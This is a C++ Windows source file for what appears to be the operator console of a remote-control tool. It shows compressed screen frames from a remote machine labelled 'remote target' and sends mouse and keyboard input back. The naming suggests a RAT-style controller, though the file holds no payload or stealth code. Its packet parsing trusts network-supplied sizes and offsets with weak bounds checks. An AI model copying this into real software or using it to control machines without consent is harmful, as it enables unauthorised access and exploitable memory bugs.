
#include <windows.h>
#include "main.h"
#include "Public.h"
#include "RemoteControlrecver.h"
#include <map>
#include "onlinemanager.h"
#include "Commander.h"
#include <time.h>
#include "RemoteControlRecver.h"

using namespace std;

map <HWND, LPREMOTE_CONTROL_PARAM> RemoteCtrlParamMap;

map<HWND, LPREMOTE_CONTROL_PARAM >::iterator mapit;

unsigned char RemoteClientKey[4] = { 0 };
STMOUSEACTION RemoteClientLButtonClick = { 0 };
STMOUSEACTION RemoteClientLButtonDoubleClick = { 0 };
STMOUSEACTION RemoteClientRButtonClick = { 0 };
STMOUSEACTION RemoteClientRButtonDoubleClick = { 0 };
REMOTECONTROLWHEEL RemoteMouseWheel = { 0 };

int g_screen_width = 0;

int g_screen_height = 0;



LRESULT CALLBACK RemoteControler::RemoteControlWindowProc(HWND hWnd, UINT nMsg, WPARAM wParam, LPARAM lParam)
{
	switch (nMsg)
	{
	case WM_PAINT:
	{
		int result = 0;
		PAINTSTRUCT stPS = { 0 };
		HDC hdcDst = BeginPaint(hWnd, &stPS);

		mapit = RemoteCtrlParamMap.find(hWnd);
		if (mapit == RemoteCtrlParamMap.end())
		{
			EndPaint(hWnd, &stPS);

			WriteLog("can not found key:%x in bitmap buffer map\r\n", hWnd);
			return TRUE;
		}

		if (mapit->second->dataType == REMOTE_PIXEL_PACKET)
		{
			char* lpClientBitmap = mapit->second->lpClientBitmap;
			RECT rect;
			GetClientRect(hWnd, &rect);
			HDC  hdcScr = CreateDCA("DISPLAY", 0, 0, 0);
			HDC hdcSource = CreateCompatibleDC(hdcScr);
			HBITMAP hbmp = CreateCompatibleBitmap(hdcScr, mapit->second->param.screenx, mapit->second->param.screeny);
			SelectObject(hdcSource, hbmp);
			result = StretchBlt(hdcSource, 0, 0, mapit->second->param.screenx, mapit->second->param.screeny, hdcDst, 0, 0,
				rect.right - rect.left, rect.bottom - rect.top, SRCCOPY);
			if (result)
			{
				char buf[0x1000];
				LPBITMAPINFO lpbmpinfo = (LPBITMAPINFO)buf;
				memset(lpbmpinfo, 0, sizeof(BITMAPINFO));
				lpbmpinfo->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
				lpbmpinfo->bmiHeader.biBitCount = mapit->second->param.bitsperpix;
				lpbmpinfo->bmiHeader.biPlanes = 1;
				lpbmpinfo->bmiHeader.biWidth = mapit->second->param.screenx;
				lpbmpinfo->bmiHeader.biHeight = mapit->second->param.screeny;
				//DWORD dwbmbitssize = ((lpbmpinfo->bmiHeader.biWidth * lpbmpinfo->bmiHeader.biBitCount + 31) / 32) * 4 * lpbmpinfo->bmiHeader.biHeight;
				lpbmpinfo->bmiHeader.biSizeImage = 0;
				char* data = mapit->second->dibits;

				result = GetDIBits(hdcSource, hbmp, 0, lpbmpinfo->bmiHeader.biHeight, data, lpbmpinfo, DIB_RGB_COLORS);
				if (result && result != ERROR_INVALID_PARAMETER)
				{
					int byteperpix = mapit->second->param.bitsperpix / 8;
					int itemsize = (sizeof(DWORD) + mapit->second->param.bitsperpix / 8);
					int cnt = mapit->second->lpbmpDataSize / itemsize;
					for (int i = 0; i < cnt; i++)
					{
						int index = itemsize * i;
						int offset = *(DWORD*)(lpClientBitmap + index);
						if (offset > mapit->second->bufLimit)
						{
							WriteLog("pixel offset error :%u\r\n", offset);
							break;
						}
						if (byteperpix == 4)
						{
							DWORD color = *(DWORD*)(lpClientBitmap + index + sizeof(DWORD));
							*(DWORD*)(data + offset) = color;
						}
						else if (byteperpix == 3)
						{
							char* color = lpClientBitmap + index + sizeof(DWORD);
							memcpy(data + offset, color, 3);
						}
						else if (byteperpix == 2)
						{
							WORD color = *(WORD*)(lpClientBitmap + index + sizeof(DWORD));
							*(WORD*)(data + offset) = color;
						}
						else if (byteperpix == 1)
						{
							unsigned char color = *(lpClientBitmap + index + sizeof(DWORD));
							*(data + offset) = color;
						}
					}
					result = SetDIBits(hdcSource, hbmp, 0, mapit->second->param.screeny, data, lpbmpinfo, DIB_RGB_COLORS);
					if (result)
					{
						result = StretchBlt(hdcDst, 0, 0, rect.right - rect.left, rect.bottom - rect.top, hdcSource, 0, 0,
							mapit->second->param.screenx, mapit->second->param.screeny, SRCCOPY);
						if (result)
						{

						}
						else {
							WriteLog("RemoteControl StretchBlt error:%u\r\n", GetLastError());
						}
					}
					else {
						WriteLog("RemoteControl SetDIBits error:%u\r\n", GetLastError());
					}
				}
				else {
					WriteLog("RemoteControl GetDIBits error:%u\r\n", GetLastError());
				}

				DeleteObject(hbmp);
				DeleteDC(hdcScr);
				DeleteDC(hdcSource);
			}
			else {
				WriteLog("RemoteControl StretchBlt error:%d\r\n", GetLastError());
			}

			mapit->second->dataType = 0;

			EndPaint(hWnd, &stPS);
			return TRUE;
		}
		else if (mapit->second->dataType == REMOTE_CLIENT_SCREEN)
		{
			char* lpClientBitmap = mapit->second->lpClientBitmap;
			HDC  hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
			HDC hdcSource = CreateCompatibleDC(hdcScr);
			LPBITMAPFILEHEADER pBMFH = (LPBITMAPFILEHEADER)lpClientBitmap;
			void* pDibts = (void*)(lpClientBitmap + pBMFH->bfOffBits);
			LPBITMAPINFOHEADER pBMIH = (LPBITMAPINFOHEADER)(lpClientBitmap + sizeof(BITMAPFILEHEADER));
			DWORD dwDibtsSize = ((pBMIH->biWidth * pBMIH->biBitCount + 31) / 32) * 4 * pBMIH->biHeight;
			char* pRemoteSrnData = 0;
			HBITMAP hRemoteBM = CreateDIBSection(0, (LPBITMAPINFO)pBMIH, DIB_RGB_COLORS, (void**)&pRemoteSrnData, 0, 0);
			if (hRemoteBM)
			{
				memcpy(pRemoteSrnData, pDibts, dwDibtsSize);
				HBITMAP hSrcBM = (HBITMAP)SelectObject(hdcSource, hRemoteBM);

				int iX = pBMIH->biWidth;
				int iY = pBMIH->biHeight;
				RECT stRect = { 0 };
				int iRet = GetClientRect(hWnd, &stRect);
				//iRet = BitBlt(hdcDst, 0, 0, stRect.right - stRect.left, stRect.bottom - stRect.top,hdcSrc, 0, 0, SRCCOPY);
				iRet = StretchBlt(hdcDst, 0, 0, stRect.right - stRect.left, stRect.bottom - stRect.top, hdcSource, 0, 0, iX, iY, SRCCOPY);
				DeleteObject(hSrcBM);
			}
			else {
				WriteLog("RemoteControl CreateDIBSection error:%u\r\n", GetLastError());
			}

			DeleteObject(hRemoteBM);
			DeleteDC(hdcScr);
			DeleteDC(hdcSource);

			mapit->second->dataType = 0;

			EndPaint(hWnd, &stPS);
			return TRUE;
		}
		else {
			//WriteLog("RemoteControl command:%d error\r\n", mapit->second->dataType);

			EndPaint(hWnd, &stPS);

			result = DefWindowProcA(hWnd, nMsg, wParam, lParam);

			return result;
		}
	}

	case WM_KEYDOWN:
	{
		RemoteClientKey[0] = wParam;
		RemoteClientKey[1] = (unsigned char)GetKeyState(VK_SHIFT);
		return 0;

		// 			int iRet = GetKeyboardState(RemoteKeyState);
		// 			if (iRet <= 0)
		// 			{
		// 				return 0;
		// 			}
		// 			char shiftState = (char)GetKeyState(VK_SHIFT);
		// 			*(RemoteKeyState + VK_SHIFT) = shiftState;
		// 			
		// 			iRet = ToAscii(wParam,lParam>>16,(BYTE*)RemoteKeyState,(LPWORD)RemoteClientKey,0);
		// 			if (iRet > 0)
		// 			{
		// 				RemoteClientKey[iRet] = 0;
		// 			}
		//			return 0;
	}

	case WM_LBUTTONDBLCLK: {
		RemoteClientLButtonDoubleClick.dwType = REMOTE_LEFTBUTTONDOUBLECLICK;
		RemoteClientLButtonDoubleClick.stPT.x = lParam & 0xffff;
		RemoteClientLButtonDoubleClick.stPT.y = lParam >> 16;
		RemoteClientLButtonDoubleClick.dwTickCnt = GetTickCount();
		return 0;
		//must return 0 in diy message
	}

	case WM_LBUTTONDOWN: {
		DWORD dwNowClickTime = GetTickCount();
		RemoteClientLButtonClick.dwType = REMOTE_LEFTBUTTONDOWN;
		RemoteClientLButtonClick.stPT.x = lParam & 0xffff;
		RemoteClientLButtonClick.stPT.y = lParam >> 16;
		RemoteClientLButtonClick.dwTickCnt = dwNowClickTime;
		return 0;
	}

	case WM_RBUTTONDOWN: {
		RemoteClientRButtonClick.dwType = REMOTE_RBUTTONDOWN;
		RemoteClientRButtonClick.stPT.x = lParam & 0xffff;
		RemoteClientRButtonClick.stPT.y = lParam >> 16;
		RemoteClientRButtonClick.dwTickCnt = GetTickCount();
		return 0;
	}

	case WM_RBUTTONDBLCLK: {
		RemoteClientRButtonDoubleClick.dwType = REMOTE_RBUTTONDOUBLECLICK;
		RemoteClientRButtonDoubleClick.stPT.x = lParam & 0xffff;
		RemoteClientRButtonDoubleClick.stPT.y = lParam >> 16;
		RemoteClientRButtonDoubleClick.dwTickCnt = GetTickCount();
		return 0;
	}

	case WM_MOUSEWHEEL: {
		//all is 120 or -120
		RemoteMouseWheel.delta = wParam;
		RemoteMouseWheel.xy = lParam;
		return 0;
	}

	case WM_DESTROY: {
		PostQuitMessage(0);
		//SendMessageA(hWnd,WM_QUIT,0,0);
		WriteLog("RemoteControl Window is closed\r\n");
		return 0;
	}

	case WM_CLOSE:
	{
		PostQuitMessage(0);
		//SendMessageA(hWnd,WM_QUIT,0,0);
		WriteLog("RemoteControl Window is closed\r\n");
		return 0;
	}
	}

	return DefWindowProcA(hWnd, nMsg, wParam, lParam);
}




BOOL __stdcall RemoteControler::RemoteControlWindow(LPREMOTE_CONTROL_PARAM lpparam)
{
	REMOTE_CONTROL_PARAM stParam = *lpparam;

	int iRet = 0;

	char* szWindowNameFormat = "<RemoteControl>_%s";
	char szWindowName[MAX_PATH];
	char szShowInfo[1024];

	wsprintfA(szShowInfo, "%u_%u_%u_%u_%u_%u_%u", lpparam->unique.cMAC[0], lpparam->unique.cMAC[1], lpparam->unique.cMAC[2], lpparam->unique.cMAC[3],
		lpparam->unique.cMAC[4], lpparam->unique.cMAC[5], time(0));
	wsprintfA(szWindowName, szWindowNameFormat, szShowInfo);

	WNDCLASSEXA stWCE = { 0 };
	stWCE.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS;
	stWCE.lpfnWndProc = RemoteControlWindowProc;
	stWCE.cbClsExtra = 0;
	stWCE.cbWndExtra = 0;
	stWCE.hInstance = 0;
	stWCE.hIcon = LoadIconA(0, (LPCSTR)WINDOW_ICON);
	stWCE.hIconSm = LoadIconA(0, (LPCSTR)WINDOW_ICON);	//taskbar icon
	stWCE.hCursor = LoadCursor(NULL, IDC_ARROW);
	stWCE.hbrBackground = (HBRUSH)(COLOR_BTNFACE);
	stWCE.lpszMenuName = NULL;
	stWCE.lpszClassName = szWindowName;
	//stWCE.hIcon = LoadIcon(NULL,IDI_WINLOGO);
	stWCE.cbSize = sizeof(WNDCLASSEXA);

	ATOM nAtom = RegisterClassExA(&stWCE);
	if (0 == nAtom)
	{
		iRet = closesocket(stParam.hSockClient);
		delete[] stParam.lpClientBitmap;
		delete lpparam;

		WriteLog("RemoteControlWindow RegisterClassExA error code:%u\r\n", GetLastError());
		return FALSE;
	}

	DEVMODE devmode = { 0 };
	devmode.dmSize = sizeof(DEVMODE);
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	if (Isgetdisplay == FALSE)
	{
		iRet = closesocket(stParam.hSockClient);

		nAtom = UnregisterClassA(szWindowName, (HINSTANCE)GetModuleHandle(0));
		delete[] stParam.lpClientBitmap;
		delete lpparam;

		WriteLog("RemoteControlWindow EnumDisplaySettings error code:%u\r\n", GetLastError());
		return FALSE;
	}

	int xscrn = devmode.dmPelsWidth;
	int yscrn = devmode.dmPelsHeight;
	g_screen_height = yscrn;
	g_screen_width = xscrn;
	int local_screen_size = devmode.dmPelsWidth * devmode.dmPelsHeight * (lpparam->param.bitsperpix / 8) + 0x1000;
	lpparam->dibits = new char[local_screen_size];

	lpparam->hwndWindow = CreateWindowExA(WS_EX_CLIENTEDGE, szWindowName, szWindowName, WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_MAXIMIZE | WS_HSCROLL | WS_VSCROLL,
		0, 0, xscrn, yscrn, NULL, NULL, 0, NULL);
	if (NULL == lpparam->hwndWindow)
	{
		iRet = closesocket(stParam.hSockClient);
		delete[] stParam.lpClientBitmap;
		delete lpparam;
		nAtom = UnregisterClassA(szWindowName, (HINSTANCE)GetModuleHandle(0));
		WriteLog("RemoteControlWindow CreateWindowExA error:%d\r\n", GetLastError());
		return NULL;
	}

	iRet = ShowWindow(lpparam->hwndWindow, SW_SHOWMAXIMIZED);
	iRet = UpdateWindow(lpparam->hwndWindow);

	RemoteCtrlParamMap.insert(map<HWND, LPREMOTE_CONTROL_PARAM>::value_type(lpparam->hwndWindow, lpparam));

	char szMac[MAX_PATH];
	wsprintfA(szMac, "<远程目标: %02X_%02X_%02X_%02X_%02X_%02X>", stParam.unique.cMAC[0], stParam.unique.cMAC[1], stParam.unique.cMAC[2], stParam.unique.cMAC[3],
		stParam.unique.cMAC[4], stParam.unique.cMAC[5]);
	SetWindowTextA(lpparam->hwndWindow, szMac);

	DWORD remotethreadid = 0;
	HANDLE hRemoteProcThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControler::RemoteControlProc, lpparam, 0, &remotethreadid);
	CloseHandle(hRemoteProcThread);

	while (TRUE)
	{
		MSG msg = { 0 };
		iRet = GetMessageA(&msg, NULL, 0, 0);		//postquitmessage can make this funtion return 0,error -1,normal message >0
		if (iRet <= 0)
		{
			//CloseHandle(hWndRemoteCtrl);		//hwnd can not be run with closehandle
			break;
		}
		else {
			iRet = TranslateMessage(&msg);		//转化虚拟按键到字符消息
			iRet = DispatchMessageA(&msg);
		}
	}

	nAtom = UnregisterClassA(szWindowName, (HINSTANCE)GetModuleHandle(0));

	//if socket closed by window,return 0

	char tmppack[1024];
	iRet = Commander::SendCmdPacket(&lpparam->unique, lpparam->hSockClient, tmppack, 1024, REMOTECONTROL_END);

	iRet = closesocket(lpparam->hSockClient);		//if socket closed by window,return 0

	//if no wait,uncompress buffer will cause exception in sometime
	Sleep(1000);

	mapit = RemoteCtrlParamMap.find(lpparam->hwndWindow);
	if (mapit != RemoteCtrlParamMap.end())
	{
		RemoteCtrlParamMap.erase(mapit);
	}

	delete[] lpparam->lpClientBitmap;
	lpparam->lpClientBitmap = 0;

	delete[] lpparam->dibits;
	lpparam->dibits = 0;

	delete lpparam;

	return TRUE;
}






int __stdcall RemoteControler::RemoteControlProc(LPREMOTE_CONTROL_PARAM lpParam)
{

	int iRet = 0;

	char* lpRecvBuf = new char[NETWORK_BUF_SIZE];
	if (lpRecvBuf)
	{
		iRet = RemoteControl(lpParam, &lpRecvBuf, NETWORK_BUF_SIZE);

	}
	else {
		WriteLog("RemoteControlListen new operator client screen recv data buffer error\r\n");
	}

	iRet = SendMessageA(lpParam->hwndWindow, WM_CLOSE, 0, 0);	//if connection is shut by client,need to close window

	delete[]lpRecvBuf;

	return FALSE;
}









int RemoteControler::RemoteControl(REMOTE_CONTROL_PARAM* lpParam, char** lpRecvBuf, int BufSize)
{
	POINT stLastServerMousePos = { 0 };

	NETWORKPROCPARAM stNetWorkParam = { 0 };
	stNetWorkParam.hSockClient = lpParam->hSockClient;
	stNetWorkParam.stAddrClient = lpParam->stAddrClient;

	char szClientInfo[MAX_PATH];
	int iRet = 0;

	int framecnt = 0;

	while (TRUE) {
		int recvSize = recv(lpParam->hSockClient, *lpRecvBuf, BufSize, 0);
		LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)*lpRecvBuf;
		int dwHdrLen = sizeof(NETWORKPACKETHEADER);
		int dataSize = lphdr->packlen;

		UNIQUECLIENTSYMBOL stUnique = lphdr->unique;
		DWORD dwCommand = lphdr->cmd;
		if (recvSize <= 0 || dataSize < 0 || dataSize > lpParam->bufLimit)
		{
			InetAddrFormatString(stNetWorkParam, szClientInfo);
			WriteLog("RemoteControlProc recv header size:%d, recv size:%d,packet size:%d, cmd:%d, error code:%u from client:%s\r\n",
				dwHdrLen, recvSize, dataSize, dwCommand, GetLastError(), szClientInfo);
			return FALSE;
		}
		else if (dataSize > BufSize - dwHdrLen && dataSize <= lpParam->bufLimit - dwHdrLen)
		{
			BufSize = dataSize + sizeof(NETWORKPACKETHEADER) + 0x1000;

			char* lpNewBuf = new char[BufSize];

			memcpy(lpNewBuf, *lpRecvBuf, recvSize);

			delete[] * lpRecvBuf;

			*lpRecvBuf = lpNewBuf;
		}

		int realSize = recvSize - dwHdrLen;
		int remainder = dataSize - realSize;
		while (dataSize > realSize)
		{
			int nextSize = recv(lpParam->hSockClient, *lpRecvBuf + recvSize, BufSize - recvSize, 0);
			if (nextSize > 0)
			{
				recvSize += nextSize;
				remainder -= nextSize;
				realSize += nextSize;
			}
			else
			{
				iRet = WSAGetLastError();
				if (dataSize >= realSize)
				{
					break;
				}
				else {
					WriteLog("RemoteControlProc recv multiple packet slice error,recv size:%d,real size:%d,remainder:%d, data size:%d\r\n",
						recvSize, realSize, remainder, dataSize);
					return FALSE;
				}
			}
		}

		int iconic = IsIconic(lpParam->hwndWindow);			//if IsIconic() == true,GetClientRect will fail
		if (iconic == FALSE)
		{
			//int iszoom = IsZoomed(stParam.hwndWindow);		
			RECT stWindowClientRect = { 0 };
			POINT stPtMouseNow = { 0 };
			int getclient = GetClientRect(lpParam->hwndWindow, &stWindowClientRect);
			int getcurpos = GetCursorPos(&stPtMouseNow);
			int clientrectok = ScreenToClient(lpParam->hwndWindow, &stPtMouseNow);
			if (getclient == FALSE || getcurpos == FALSE || clientrectok == FALSE) {
				iRet = Commander::SendCmdPacket(&stUnique, lpParam->hSockClient, *lpRecvBuf, BufSize, REMOTE_DUMMY_PACKET);
				if (iRet <= 0)
				{
					WriteLog("RemoteControlProc send REMOTE_DUMMY_PACKET error\r\n");
					return FALSE;
				}
				else {
					WriteLog("RemoteControlProc GetClientRect():%u or GetCursorPos():%u or ScreenToClient():%u error\r\n", getclient, getcurpos, clientrectok);
				}
				//must be in next loop(one recv and one send is a loop)
				continue;
			}

			if (dwCommand == REMOTE_CLIENT_SCREEN || dwCommand == REMOTE_PIXEL_PACKET)
			{
				LPNETWORKFILEHDR lpfhdr = (LPNETWORKFILEHDR)*lpRecvBuf;
				char* lpcompdata = *lpRecvBuf + sizeof(NETWORKFILEHDR);
				int compsize = lpfhdr->packhdr.packlen - sizeof(int);
				int uncomplen = lpfhdr->origin_len;
				long lZlibBufLen = lpParam->bufLimit;
				if (lZlibBufLen < uncomplen || lpParam->lpClientBitmap == 0)
				{
					WriteLog("RemoteControlProc decompress buffer:%x or uncompress size or compress size error:%d\r\n",
						lpParam->lpClientBitmap, lZlibBufLen, uncomplen);
					return FALSE;
				}

				iRet = uncompress((Bytef*)lpParam->lpClientBitmap, (uLongf*)&lZlibBufLen, (const Bytef*)lpcompdata, (uLongf)compsize);
				if (iRet != Z_OK /*|| *(WORD*)(lpParam->lpClientBitmap) != 0x4d42*/)
				{
					InetAddrFormatString(stNetWorkParam, szClientInfo);
					WriteLog("RemoteControlProc unzip error,format:%x,uncompress len:%d,compsize:%d,client:%s\r\n",
						*(WORD*)(lpParam->lpClientBitmap), lZlibBufLen, compsize, szClientInfo);
					//if connection is shut by client,need to close window
					return FALSE;
				}
				else {
					framecnt++;
					if (framecnt % 10 == 0)
					{
						WriteLog("RemoteControlProc uncompress zip size:%u,unzip size:%u\r\n", compsize, lZlibBufLen);
					}
				}

				lpParam->lpbmpDataSize = lZlibBufLen;
				lpParam->dataType = dwCommand;
				iRet = InvalidateRect(lpParam->hwndWindow, &stWindowClientRect, FALSE);
				//false will make it more faster and not lighting when reflash
				//如果客户区全部无效 UpdateWindow将导致Windows用WM_PAINT消息调用窗口过程（如果整个客户区有效，则不调用窗口过程）
				//如果客户区部分有效 这一WM_PAINT消息不进入消息队列，直接由WINDOWS调用窗口过程
				//UpdateWindow(hWndRemoteCtrl);
				//RedrawWindow(hWndRemoteCtrl,&stRect,0,RDW_INTERNALPAINT);
			}
			else if (dwCommand == REMOTE_NONE_SCREEN)
			{

			}
			else {
				WriteLog("RemoteControlProc unknown cmd:%u\r\n", dwCommand);
			}

			POINT stMaxPoint = { 0 };
			stMaxPoint.x = stWindowClientRect.right - (stWindowClientRect.left);
			stMaxPoint.y = stWindowClientRect.bottom - (stWindowClientRect.top);

			char szSendBuf[1024];
			int iSendDataLen = 0;
			//lphdr = (LPNETWORKPACKETHEADER)*lpRecvBuf;
			if (stPtMouseNow.x != stLastServerMousePos.x || stPtMouseNow.y != stLastServerMousePos.y) {
				stLastServerMousePos.x = stPtMouseNow.x;
				stLastServerMousePos.y = stPtMouseNow.y;

				/*
				lphdr->cmd = REMOTE_MOUSE_POS;
				lphdr->unique = stUnique;
				lphdr->packlen = sizeof(POINT) + sizeof(POINT);
				LPREMOTECONTROLMOUSEPOS pos =  (LPREMOTECONTROLMOUSEPOS)(*lpRecvBuf + sizeof(NETWORKPACKETHEADER));
				pos->pos.x = stPtMouseNow.x;
				pos->pos.y = stPtMouseNow.y;
				pos->size.x = stMaxPoint.x;
				pos->size.y = stMaxPoint.y;
				*/

				* (DWORD*)(szSendBuf + iSendDataLen) = REMOTE_MOUSE_POS;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT) + sizeof(POINT);
				iSendDataLen += sizeof(DWORD);
				*(long*)(szSendBuf + iSendDataLen) = stPtMouseNow.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stPtMouseNow.y;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.y;
				iSendDataLen += sizeof(long);
			}
			else if (RemoteMouseWheel.delta && RemoteMouseWheel.xy)
			{
				LPNETWORKPACKETHEADER hdr = (LPNETWORKPACKETHEADER)szSendBuf;
				hdr->cmd = REMOTE_MOUSEWHEEL;
				hdr->unique = stUnique;
				hdr->packlen = sizeof(REMOTECONTROLWHEEL);
				LPREMOTECONTROLWHEEL wheel = (LPREMOTECONTROLWHEEL)(szSendBuf + sizeof(NETWORKPACKETHEADER));
				wheel->delta = RemoteMouseWheel.delta;
				wheel->xy = RemoteMouseWheel.xy;
				iSendDataLen = sizeof(NETWORKPACKETHEADER) + sizeof(REMOTECONTROLWHEEL);
				/*
				*(DWORD*)(szSendBuf + iSendDataLen) = REMOTE_MOUSEWHEEL;
				iSendDataLen += sizeof(DWORD);

				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);

				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT);
				iSendDataLen += sizeof(DWORD);

				*(long*)(szSendBuf + iSendDataLen) = RemoteMouseWheel.delta;
				iSendDataLen += sizeof(DWORD);

				*(long*)(szSendBuf + iSendDataLen) = RemoteMouseWheel.xy;
				iSendDataLen += sizeof(DWORD);
				*/

				RemoteMouseWheel.delta = 0;
				RemoteMouseWheel.xy = 0;
			}
			else if (RemoteClientLButtonClick.dwType) {
				*(DWORD*)(szSendBuf + iSendDataLen) = RemoteClientLButtonClick.dwType;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT) + sizeof(POINT);
				iSendDataLen += sizeof(DWORD);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientLButtonClick).stPT.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientLButtonClick).stPT.y;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.y;
				iSendDataLen += sizeof(long);
				RemoteClientLButtonClick.dwType = 0;
			}
			else if (RemoteClientRButtonClick.dwType)
			{
				*(DWORD*)(szSendBuf + iSendDataLen) = RemoteClientRButtonClick.dwType;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT) + sizeof(POINT);
				iSendDataLen += sizeof(DWORD);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientRButtonClick).stPT.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientRButtonClick).stPT.y;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.y;
				iSendDataLen += sizeof(long);
				RemoteClientRButtonClick.dwType = 0;
			}
			else if (RemoteClientLButtonDoubleClick.dwType)
			{
				*(DWORD*)(szSendBuf + iSendDataLen) = RemoteClientLButtonDoubleClick.dwType;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT) + sizeof(POINT);
				iSendDataLen += sizeof(DWORD);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientLButtonDoubleClick).stPT.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientLButtonDoubleClick).stPT.y;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.y;
				iSendDataLen += sizeof(long);
				RemoteClientLButtonDoubleClick.dwType = 0;
			}
			else if (RemoteClientRButtonDoubleClick.dwType)
			{
				*(DWORD*)(szSendBuf + iSendDataLen) = RemoteClientRButtonDoubleClick.dwType;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = sizeof(POINT) + sizeof(POINT);
				iSendDataLen += sizeof(DWORD);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientRButtonDoubleClick).stPT.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = (RemoteClientRButtonDoubleClick).stPT.y;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.x;
				iSendDataLen += sizeof(long);
				*(long*)(szSendBuf + iSendDataLen) = stMaxPoint.y;
				iSendDataLen += sizeof(long);
				RemoteClientRButtonDoubleClick.dwType = 0;
			}
			else if (RemoteClientKey[0]) {
				*(DWORD*)(szSendBuf + iSendDataLen) = REMOTE_KEYBOARD;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				int iKeyCnt = 1;
				*(DWORD*)(szSendBuf + iSendDataLen) = 2;
				iSendDataLen += sizeof(DWORD);
				*(szSendBuf + iSendDataLen) = RemoteClientKey[0];
				iSendDataLen += iKeyCnt;
				*(szSendBuf + iSendDataLen) = RemoteClientKey[1];
				iSendDataLen += iKeyCnt;
				//memmove(szSendBuf + iSendDataLen,RemoteKeyState,256);
				//iSendDataLen += 256;
				RemoteClientKey[0] = 0;
				RemoteClientKey[1] = 0;
			}
			else {
				*(DWORD*)(szSendBuf + iSendDataLen) = REMOTE_DUMMY_PACKET;
				iSendDataLen += sizeof(DWORD);
				*(LPUNIQUECLIENTSYMBOL)(szSendBuf + iSendDataLen) = stUnique;
				iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
				*(DWORD*)(szSendBuf + iSendDataLen) = 0;
				iSendDataLen += sizeof(DWORD);
			}

			iRet = send(lpParam->hSockClient, szSendBuf, iSendDataLen, 0);
			if (iRet <= 0)
			{
				WriteLog("RemoteControlProc send error code:%u\r\n", GetLastError());
				return FALSE;
			}
		}
		else {
			iRet = Commander::SendCmdPacket(&stUnique, lpParam->hSockClient, *lpRecvBuf, BufSize, REMOTE_DUMMY_PACKET);
			if (iRet <= 0)
			{
				WriteLog("RemoteControlProc send REMOTE_DUMMY_PACKET error\r\n");
				return FALSE;
			}
			else {
				WriteLog("RemoteControlProc IsIconic\r\n");
			}
		}
	}

	return TRUE;
}